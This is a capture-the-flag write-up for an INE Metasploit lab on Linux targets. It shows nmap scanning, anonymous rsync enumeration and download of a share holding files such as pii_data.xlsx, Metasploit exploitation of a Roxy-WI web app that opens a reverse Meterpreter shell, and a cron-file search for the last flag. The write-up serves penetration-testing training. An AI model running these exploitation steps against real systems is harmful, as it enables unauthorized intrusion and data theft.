

## **OVERVIEW

Linux-based systems are frequently targeted in penetration tests due to their prevalence in server environments. This lab focuses on using the Metasploit Framework (MSF) to exploit misconfigured services and vulnerable applications on Linux systems. Participants will leverage MSF to enumerate services, explore file systems, and exploit web applications to achieve shell access.

## **Task

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.


# Lab Environment

In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at **target1.ine.local** and **target2.ine.local**.

**Objective:** Using various exploration techniques, complete the following tasks to capture the associated flags:

- **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
- **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
- **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
- **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- rsync

_____________

## **nmap 

```
sudo nmap -Pn -sV -sC -O target2.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 19:54 IST
Nmap scan report for target2.ine.local (192.94.82.4)
Host is up (0.000075s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Roxy-WI
443/tcp open  ssl/http Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Roxy-WI
| ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
| Not valid before: 2022-07-29T05:20:44
|_Not valid after:  2050-12-14T05:20:44
|_ssl-date: TLS randomness does not represent time
MAC Address: 02:42:C0:5E:52:04 (Unknown)

```


_________
**Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.

```
rsync --list-only rsync://target1.ine.local:873/                                                                                                                                       
backupwscohen   FLAG1_16b5744b045b4d1db7dd15b84444b42e

```


__________

**Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.

```
 rsync --list-only rsync://target1.ine.local:873/                                                                                                                                                                                      
backupwscohen   FLAG1_16b5744b045b4d1db7dd15b84444b42e

┌──(root㉿INE)-[~]
└─# rsync --list-only rsync://target1.ine.local:873/backupwscohen                                                                                                                                                                          
drwxr-xr-x          4,096 2025/09/30 19:53:18 .
-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--             39 2025/09/30 19:53:18 pii_data.xlsx

┌──(root㉿INE)-[~]
└─# rsync --list-only rsync://target1.ine.local:873/backupwscohen ./rsync_content/                                                                                                                                                         
drwxr-xr-x          4,096 2025/09/30 19:53:18 .
-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--             39 2025/09/30 19:53:18 pii_data.xlsx

┌──(root㉿INE)-[~]
└─# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  thinclient_drives  Videos

┌──(root㉿INE)-[~]
└─# rsync -av rsync://target1.ine.local:873/backupwscohen ./rsync_content/
receiving incremental file list
created directory ./rsync_content
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20

┌──(root㉿INE)-[~]
└─# ls                                                                                                                                                                                     
Desktop  Documents  Downloads  Music  Pictures  Public  rsync_content  Templates  thinclient_drives  Videos

┌──(root㉿INE)-[~]
└─#                                                                                                                                                                                        

┌──(root㉿INE)-[~]
└─# cd rsync_content/                                                                                                                                                                      

┌──(root㉿INE)-[~/rsync_content]
└─# ls                                                                                                                                                                                     
office_staff.vhd  pii_data.xlsx  TPSData.txt

┌──(root㉿INE)-[~/rsync_content]
└─# cat pii_data.xlsx 
FLAG2_64695e66354d496192ac6fdfcf4b2277

```

_____________

**Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.

we know http-title - Roxy-WI

```
msf6 exploit(linux/http/roxy_wi_exec) > show options

Module options (exploit/linux/http/roxy_wi_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the vulnerable instance
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/roxy_wi_exec) > set RHOSTS target2.ine.local
RHOSTS => target2.ine.local
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST 192.94.82.2
LHOST => 192.94.82.2
msf6 exploit(linux/http/roxy_wi_exec) > run

[*] Started reverse TCP handler on 192.94.82.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.94.82.4:443 is vulnerable!
[*] 192.94.82.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Sending stage (24772 bytes) to 192.94.82.4
[*] Meterpreter session 1 opened (192.94.82.2:4444 -> 192.94.82.4:56356) at 2025-09-30 19:58:40 +0530

meterpreter > 

```


```
meterpreter > cd /
meterpreter > ls
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2025-09-30 19:53:16 +0530  .dockerenv
040755/rwxr-xr-x  4096  dir   2022-07-29 11:01:41 +0530  bin
040755/rwxr-xr-x  4096  dir   2022-04-18 15:58:59 +0530  boot
040755/rwxr-xr-x  340   dir   2025-09-30 19:53:17 +0530  dev
040755/rwxr-xr-x  4096  dir   2025-09-30 19:53:16 +0530  etc
100644/rw-r--r--  39    fil   2025-09-30 19:53:17 +0530  flag.txt
040755/rwxr-xr-x  4096  dir   2022-04-18 15:58:59 +0530  home
040755/rwxr-xr-x  4096  dir   2022-07-28 19:03:58 +0530  lib
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:11 +0530  lib32
040755/rwxr-xr-x  4096  dir   2022-05-31 21:13:16 +0530  lib64
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:11 +0530  libx32
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:12 +0530  media
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:12 +0530  mnt
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:12 +0530  opt
040555/r-xr-xr-x  0     dir   2025-09-30 19:53:17 +0530  proc
040700/rwx------  4096  dir   2022-07-28 19:09:04 +0530  root
040755/rwxr-xr-x  4096  dir   2025-09-30 19:53:30 +0530  run
040755/rwxr-xr-x  4096  dir   2022-07-28 19:03:45 +0530  sbin
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:12 +0530  srv
040555/r-xr-xr-x  0     dir   2024-08-14 17:17:07 +0530  sys
041777/rwxrwxrwx  4096  dir   2025-09-30 19:53:30 +0530  tmp
040755/rwxr-xr-x  4096  dir   2022-05-31 21:12:12 +0530  usr
040755/rwxr-xr-x  4096  dir   2022-07-28 19:02:55 +0530  var

meterpreter > cat flag.txt
FLAG3_a6ba3cbd30b74b2a8e0af5601c310fc5
```

___________

**Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

`default cron jobs path is /etc`

```
meterpreter > cd /etc/

meterpreter > cd cron.d
meterpreter > ls
Listing: /etc/cron.d
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  201   fil   2022-01-09 01:32:36 +0530  e2scrub_all
100644/rw-r--r--  65    fil   2025-09-30 19:53:19 +0530  www-data-cron

meterpreter > cat www-data-cron
* * * * * www-data echo "FLAG4_3cb2730c43884b279effbdf391d2b1b0"

```

CHECK OUT : https://prinugupta.medium.com/host-network-penetration-testing-the-metasploit-framework-ctf-2-ejpt-ine-a9a0f100c84a


